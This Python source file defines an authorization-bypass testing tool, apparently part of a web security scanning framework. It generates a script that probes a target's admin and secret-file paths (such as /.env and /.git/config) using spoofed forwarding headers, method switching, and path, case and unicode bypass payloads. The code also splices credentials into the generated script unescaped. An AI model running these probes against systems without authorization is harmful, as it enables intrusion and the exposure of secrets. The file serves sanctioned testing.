"""Authorization bypass testing tool."""

from workers.authorization.base_tool import AuthorizationTool
from workers.authorization.concurrency import WeightClass


class AuthzBypassTester(AuthorizationTool):
    """Test for authorization bypass vulnerabilities (WSTG-AUTHZ-002)."""

    name = "authz_bypass_tester"
    weight_class = WeightClass.HEAVY

    def build_command(self, target, credentials=None):
        target_url = getattr(target, 'target_value', str(target))
        base_url = target_url if target_url.startswith(('http://', 'https://')) else f"https://{target_url}"

        cred_json = "None"
        if credentials:
            import json as _j
            cred_json = _j.dumps(credentials)

        script = f'''
import httpx
import json
import sys

results = []
base_url = "{base_url}"
credentials = json.loads('{cred_json}') if '{cred_json}' != "None" else None

protected_paths = [
    "/admin",
    "/admin/",
    "/dashboard",
    "/api/admin",
    "/api/admin/users",
    "/manage",
    "/console",
    "/admin/dashboard",
    "/admin/settings",
    "/admin/users",
    "/admin/config",
    "/admin/login",
    "/administrator",
    "/wp-admin",
    "/phpmyadmin",
    "/cpanel",
    "/server-status",
    "/server-info",
    "/.env",
    "/.git/config",
    "/.htaccess",
    "/web.config",
    "/config.php",
    "/config.json",
    "/debug",
    "/actuator",
    "/actuator/env",
    "/actuator/health",
    "/swagger-ui.html",
    "/api-docs",
    "/graphql",
    "/graphiql",
]

bypass_headers = [
    {{"X-Original-URL": "/admin"}},
    {{"X-Rewrite-URL": "/admin"}},
    {{"X-Host": "localhost"}},
    {{"X-Forwarded-Host": "localhost"}},
    {{"X-Forwarded-For": "127.0.0.1"}},
    {{"X-Forwarded-Proto": "http"}},
    {{"X-Custom-IP-Authorization": "127.0.0.1"}},
    {{"Forwarded": "for=127.0.0.1"}},
    {{"True-Client-IP": "127.0.0.1"}},
    {{"Origin": "https://localhost"}},
    {{"Referer": "https://localhost/admin"}},
]

method_bypass_methods = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

path_bypass_variants = [
    "/admin/./",
    "/admin/../admin",
    "/admin//",
    "/admin;/",
    "/admin?/",
    "/admin%2f",
    "/admin%2F",
    "/.admin/",
    "/admin..;/",
    "/admin/%2e%2e/",
]

case_variants = [
    "/Admin",
    "/ADMIN",
    "/aDmIn",
    "/AdMiN",
    "/admIn",
    "/aDMIN",
]

unicode_variants = [
    "/%ef%bc%81dmin",
    "/%e2%80%8badmin",
    "/admin\u200b",
    "/\u202eadmin",
    "/\u0000admin",
]

headers = {{"User-Agent": "WebAppBH-Authorization-Tester"}}
if credentials and credentials.get("token"):
    headers["Authorization"] = "Bearer " + credentials["token"]

auth_bypass_indicators = [
    ("admin", "high", "admin panel accessible"),
    ("dashboard", "medium", "dashboard accessible"),
    ("secret", "high", "secret content exposed"),
    ("password", "high", "password-related content exposed"),
    ("token", "medium", "token-related content exposed"),
    ("api_key", "high", "API key exposed"),
    ("private", "medium", "private content accessible"),
    ("confidential", "high", "confidential content accessible"),
    ("internal", "medium", "internal content accessible"),
]

def check_response(url, resp, test_type, payload_info):
    bypassed = False
    matched_indicator = None
    severity = "medium"

    if resp.status_code == 200 and len(resp.text) > 50:
        for indicator, sev, desc in auth_bypass_indicators:
            if indicator.lower() in resp.text.lower():
                bypassed = True
                matched_indicator = desc
                severity = sev
                break

        if not bypassed:
            bypassed = True
            matched_indicator = "protected path returned 200 OK"
            severity = "medium"

    if bypassed:
        results.append({{
            "title": f"Authorization bypass - {{test_type}}",
            "description": f"Protected path accessible via {{test_type}}: {{url}}",
            "severity": severity,
            "data": {{
                "url": url,
                "test_type": test_type,
                "payload": payload_info,
                "indicator": matched_indicator,
                "status_code": resp.status_code,
                "content_length": len(resp.text)
            }}
        }})

try:
    client = httpx.Client(follow_redirects=True, timeout=10, verify=False)

    for path in protected_paths:
        url = base_url + path

        try:
            resp = client.get(url, headers=headers)
            check_response(url, resp, "direct_access", path)
        except Exception:
            pass

        for header_set in bypass_headers:
            test_headers = dict(headers)
            test_headers.update(header_set)
            try:
                resp = client.get(url, headers=test_headers)
                check_response(url, resp, "header_bypass", str(header_set))
            except Exception:
                pass

        for method in method_bypass_methods:
            try:
                resp = client.request(method, url, headers=headers)
                check_response(url, resp, f"method_bypass_{{method}}", method)
            except Exception:
                pass

        for variant in path_bypass_variants:
            variant_url = base_url + variant
            try:
                resp = client.get(variant_url, headers=headers)
                check_response(variant_url, resp, "path_normalization_bypass", variant)
            except Exception:
                pass

        for variant in case_variants:
            variant_url = base_url + variant
            try:
                resp = client.get(variant_url, headers=headers)
                check_response(variant_url, resp, "case_sensitivity_bypass", variant)
            except Exception:
                pass

        for variant in unicode_variants:
            variant_url = base_url + variant
            try:
                resp = client.get(variant_url, headers=headers)
                check_response(variant_url, resp, "unicode_bypass", variant)
            except Exception:
                pass

    client.close()

except Exception as e:
    results.append({{
        "title": "Authorization bypass test error",
        "description": str(e),
        "severity": "info",
        "data": {{"error": str(e)}}
    }})

print(json.dumps(results))
'''
        return ["python3", "-c", script]

    def parse_output(self, stdout):
        import json
        try:
            return json.loads(stdout.strip())
        except (json.JSONDecodeError, ValueError):
            return []
